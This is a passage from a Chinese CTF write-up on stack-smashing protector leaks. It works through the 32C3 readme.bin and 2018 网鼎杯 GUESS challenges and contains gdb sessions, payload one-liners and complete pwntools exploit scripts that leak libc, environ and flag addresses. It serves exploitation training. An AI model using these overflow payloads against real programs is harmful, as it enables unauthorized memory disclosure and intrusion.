class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>因此offset &#x3D; 536。为了做题的效率，不可能去一个一个尝试，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  gdb-peda$ find /home</span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">&#x27;/home&#x27;</span> in: None ranges</span><br><span class="line">Found <span class="number">5</span> results, display max <span class="number">5</span> items:</span><br><span class="line">[stack] : <span class="number">0x7fffffffd0c8</span> (<span class="string">&quot;/home/pwn/Desktop/readme.bin&quot;</span>)</span><br><span class="line">[stack] : <span class="number">0x7fffffffec71</span> (<span class="string">&quot;/home/pwn/Desktop&quot;</span>)</span><br><span class="line">[stack] : <span class="number">0x7fffffffec91</span> (<span class="string">&quot;/home/pwn&quot;</span>)</span><br><span class="line">[stack] : <span class="number">0x7fffffffef29</span> (<span class="string">&quot;/home/pwn/.Xauthority&quot;</span>)</span><br><span class="line">[stack] : <span class="number">0x7fffffffefdb</span> (<span class="string">&quot;/home/pwn/Desktop/readme.bin&quot;</span>)</span><br><span class="line">gdb-peda$ find <span class="number">0x7fffffffd0c8</span></span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">&#x27;0x7fffffffd0c8&#x27;</span> in: None ranges</span><br><span class="line">Found <span class="number">2</span> results, display max <span class="number">2</span> items:</span><br><span class="line">   libc : <span class="number">0x7ffff7dd43b8</span> --&gt; <span class="number">0x7fffffffd0c8</span> (<span class="string">&quot;/home/pwn/Desktop/readme.bin&quot;</span>)</span><br><span class="line">[stack] : <span class="number">0x7fffffffcde8</span> --&gt; <span class="number">0x7fffffffd0c8</span> (<span class="string">&quot;/home/pwn/Desktop/readme.bin&quot;</span>)</span><br><span class="line">gdb-peda$ distance $rsp <span class="number">0x7fffffffcde8</span></span><br><span class="line">From <span class="number">0x7fffffffcbd0</span> to <span class="number">0x7fffffffcde8</span>: <span class="number">536</span> bytes, <span class="number">134</span> dwords</span><br><span class="line">这个计算距离只是特例，最好是按照上一部分例子中的方法来计算，下断点，distance 地址<span class="number">1</span> 地址<span class="number">2.</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以在IDA下发现.data段的变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  .data:0000000000600D20 byte_600D20     db 33h                  ; DATA XREF: sub_4007E0+6E↑w</span><br><span class="line">.data:0000000000600D21 a2c3Theserverha db <span class="string">&#x27;2C3_TheServerHasTheFlagHere...&#x27;</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只需要将此变量进行显示即可，于是构造payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x600d20)+&quot;\n&quot;+&#x27;</span>|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What<span class="string">&#x27;s your name? Nice to meet you, AAAAAAA.....</span></span><br><span class="line"><span class="string">Please overwrite the flag: Thank you, bye!</span></span><br><span class="line"><span class="string">*** stack smashing detected ***:   terminated</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>没有成功，再看代码逻辑。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x40083f</span>:    call   <span class="number">0x4006a0</span> &lt;_IO_getc<span class="meta">@plt</span>&gt;</span><br><span class="line"><span class="number">0x400844</span>:    cmp    eax,<span class="number">0xffffffff</span></span><br><span class="line"><span class="number">0x400847</span>:    je     <span class="number">0x40089f</span></span><br><span class="line"><span class="number">0x400849</span>:    cmp    eax,<span class="number">0xa</span></span><br><span class="line"><span class="number">0x40084c</span>:    je     <span class="number">0x400860</span></span><br><span class="line"><span class="number">0x40084e</span>:    mov    BYTE PTR [rbx+<span class="number">0x600d20</span>],al</span><br><span class="line"><span class="number">0x400854</span>:    add    rbx,<span class="number">0x1</span></span><br><span class="line"><span class="number">0x400858</span>:    cmp    rbx,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x40085c</span>:    jne    <span class="number">0x400838</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是第二次输入的汇编部分，其中执行了mov BYTE PTR [rbx+0x600d20],al(此时rbx &#x3D; 0)，也就是byte_600D20[v0++] &#x3D; v1，这就把byte_600D20变量循环覆盖掉，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x600d20)+&quot;\n&quot;+&quot;BBBB&quot;&#x27;</span>|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What<span class="string">&#x27;s your name? Nice to meet you, AAAAAAA.....</span></span><br><span class="line"><span class="string">Please overwrite the flag: Thank you, bye!</span></span><br><span class="line"><span class="string">*** stack smashing detected ***: BBBB terminated</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>但是当ELF文件比较小的时候，它的不同区段可能会被多次映射，在ELF内存映射的时候，bss段会被映射两次，也就是说flag有备份，我们可以使用另一处的地址进行输出，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  gdb-peda$ find 32C3</span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">&#x27;32C3&#x27;</span> in: None ranges</span><br><span class="line">Found <span class="number">2</span> results, display max <span class="number">2</span> items:</span><br><span class="line">readme.bin : <span class="number">0x400d20</span> (<span class="string">&quot;32C3_TheServerHasTheFlagHere...&quot;</span>)</span><br><span class="line">readme.bin : <span class="number">0x600d20</span> (<span class="string">&quot;32C3_TheServerHasTheFlagHere...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时选择0x400d20进行构造payload即可成功打印出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x400d20)+&quot;\n&quot;&#x27;</span>|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What<span class="string">&#x27;s your name? Nice to meet you, AAAAAAAA....</span></span><br><span class="line"><span class="string">Please overwrite the flag: Thank you, bye!</span></span><br><span class="line"><span class="string">*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated</span></span><br><span class="line"><span class="string">段错误</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>由于题目在远程服务器上，而且LIBC_FATAL_STDERR&#x3D;0，这个错误提示只会显示在远端，不会返回到我们这端。因此必须设置如下环境变量LIBC_FATAL_STDERR&#x3D;1，才能实现将标准错误信息通过管道输出到远程shell中。因此，我们还必须设置该参数。那么环境变量在哪？有什么用？在libc_message函数的源代码可以看到LIBC_FATAL_STDERR_使用读取了环境变量libc_secure_getenv。如果它没有被设置、或者为空（\x00或NULL），那么stderr被重定向到_PATH_TTY（这通常是&#x2F;dev&#x2F;tty），因此将错误消息不被发送，只在服务器侧可见。位置在高于libc_argv[0]内存单元，且在libc_main[0]地址+8之后。因此exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  from pwn <span class="keyword">import</span> *</span><br><span class="line">env_addr = <span class="number">0x600d20</span></span><br><span class="line">flag_addr = <span class="number">0x400d20</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./read.bin&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;A&quot;</span>*<span class="number">536</span> + p64(flag_addr) + <span class="string">&quot;A&quot;</span>*<span class="number">8</span> + p64(env_addr))</span><br><span class="line">r.sendline(<span class="string">&quot;LIBC_FATAL_STDERR_=1&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;The flag is: %s&quot;</span> % r.recvuntil(<span class="string">&quot; &quot;</span>).strip())</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本地测试：<img src="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png" alt="Test" title="栈溢出技巧（下）"></p><h3 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h3><p>2018年网鼎杯中guess题目，相对于题目一，flag的位置在栈中而不是bss段，而且ASLR后地址是无法预测的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">  __int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="type">char</span> s2; <span class="comment">// [rsp+60h] [rbp-40h]</span></span><br><span class="line">  unsigned __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  v7 = 3LL;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  sub_4009A6();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">&quot;./flag.txt&quot;</span>, <span class="number">0</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == -<span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;./flag.txt&quot;</span>);</span><br><span class="line">    _exit(-<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;buf, 0x30uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  puts(<span class="string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;you have no sense... bye :-) &quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(<span class="string">&quot;Please type your guessing flag&quot;</span>);</span><br><span class="line">  gets(&amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(<span class="string">&quot;You must have great six sense!!!! :-o &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    puts(<span class="string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> 0LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ checksec GUESS </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Desktop/GUESS&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先捋一捋流程首先由于使用了gets，因此可以无限制溢出，并且有三次机会。然后发现flag.txt中flag值通过read(SHIDWORD(stat_loc.__iptr), &amp;buf, 0x30uLL)读入到了栈中，&amp;buf处。最后开启了canary，可以使用stack smashing的方法泄漏处flag的值。那么怎样去构造呢？想要获取flag的值，就得获取buf的栈中的地址，因为ASLR的原因，那么需要先泄漏libc的基址，根据偏移去计算出加载后的栈中buf的地址。但是现在问题是得到了libc的的加载地址，怎么算出stack的加载地址，因为每次加载的时候，两者相距的长度变化的。解决的办法就是找一个与stack的加载地址的偏移量不变的参照物，或者说与buf的栈地址偏移量不变的参照物，此参照物可以根据已有的条件计算出实际的加载地址。此时就需要补充一个知识点：在libc中保存了一个函数叫environ，存的是当前进程的环境变量，environ指向的位置是栈中环境变量的地址，其中environ的地址 &#x3D; libc基址 + _environ的偏移量，也就说在内存布局中，他们同属于一个段，开启ASLR之后相对位置不变，偏移量和libc库有关，environ的地址(&amp;environ)和libc基址的偏移量是不会的，并且通过&amp;environ找到_environ内存单元中的值是栈中环境变量的地址，根据此地址可以找到环境变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  pwn<span class="meta">@pwn</span>-PC:~/Desktop$ objdump -d /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.24</span>.so | grep __environ</span><br><span class="line">dc97d:  <span class="number">48</span> c7 <span class="number">05</span> c0 f5 2b <span class="number">00</span>    movq   $<span class="number">0xfff</span>,<span class="number">0x2bf5c0</span>(%rip)        # 39bf48 &lt;__environ@<span class="meta">@GLIBC_2</span><span class="number">.2</span><span class="number">.5</span>+<span class="number">0x10</span>&gt;</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>__environ在libc中的偏移量为0x39bf38。<img src="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png" alt="Test" title="栈溢出技巧（下）"><br>这样一来，栈中environ的值和buf的栈地址的相对位置是固定的，可以根据environ的值-偏移量&#x3D;buf的栈地址。那么程序中这三次输入分别是：第一次，通过泄露函数的got表内容，计算得到libc基址。第二次，通过libc基址和偏移量计算得到&amp;environ，获取environ的值。第三次，通过_environ的值，计算出buf的栈地址，泄露buf中存储的flag的值。步骤如下：第一次泄漏libc基址</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">  from pwn <span class="keyword">import</span> *</span><br><span class="line"># context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"># context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"># context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span> ,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./GUESS&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gets_got = elf.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"># print <span class="title function_">hex</span><span class="params">(gets_got)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;guessing flag\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(gets_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;detected ***: &#x27;</span>)</span><br><span class="line">gets_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base_addr = gets_addr - libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">print <span class="string">&#x27;libc_base_addr: &#x27;</span> + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process <span class="string">&#x27;./GUESS&#x27;</span>: pid <span class="number">28733</span></span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Desktop/GUESS&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">[*] <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">libc_base_addr: <span class="number">0x7ff71434f000</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第二次泄漏_environ的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  environ_addr = libc_base_addr + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line"># print <span class="string">&#x27;environ_addr: &#x27;</span> + hex(environ_addr)</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please type your guessing flag&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***: &#x27;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">print <span class="string">&#x27;stack_addr: &#x27;</span>+hex(stack_addr)</span><br><span class="line"></span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process <span class="string">&#x27;./GUESS&#x27;</span>: pid <span class="number">29707</span></span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Desktop/GUESS&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">[*] <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">libc_base_addr: <span class="number">0x7f8d02122000</span></span><br><span class="line">stack_addr: <span class="number">0x7ffc5a61c908</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第三次泄漏flag的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  计算出stack_addr和buf_addr的相距长度</span><br><span class="line">pwndbg&gt; distance <span class="number">0x7fffffffcca0</span> <span class="number">0x7fffffffce08</span></span><br><span class="line"><span class="number">0x7fffffffcca0</span>-&gt;<span class="number">0x7fffffffce08</span> is <span class="number">0x168</span> bytes (<span class="number">0x2d</span> words)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please type your guessing flag&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***: &#x27;</span>)</span><br><span class="line">flag = p.recvline()</span><br><span class="line">print <span class="string">&#x27;flag:&#x27;</span> + flag</span><br><span class="line"></span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process <span class="string">&#x27;./GUESS&#x27;</span>: pid <span class="number">29877</span></span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Desktop/GUESS&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">[*] <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">libc_base_addr: <span class="number">0x7f8d02122000</span></span><br><span class="line">stack_addr: <span class="number">0x7ffc5a61c908</span></span><br><span class="line">flag: flag&#123;stack_smash&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">  from pwn <span class="keyword">import</span> *</span><br><span class="line"># context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"># context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"># context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span> ,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./GUESS&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gets_got = elf.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"># print <span class="title function_">hex</span><span class="params">(gets_got)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;guessing flag\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(gets_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;detected ***: &#x27;</span>)</span><br><span class="line">gets_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base_addr = gets_addr - libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">print <span class="string">&#x27;libc_base_addr: &#x27;</span> + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line"># print <span class="string">&#x27;environ_addr: &#x27;</span> + hex(environ_addr)</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please type your guessing flag&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected 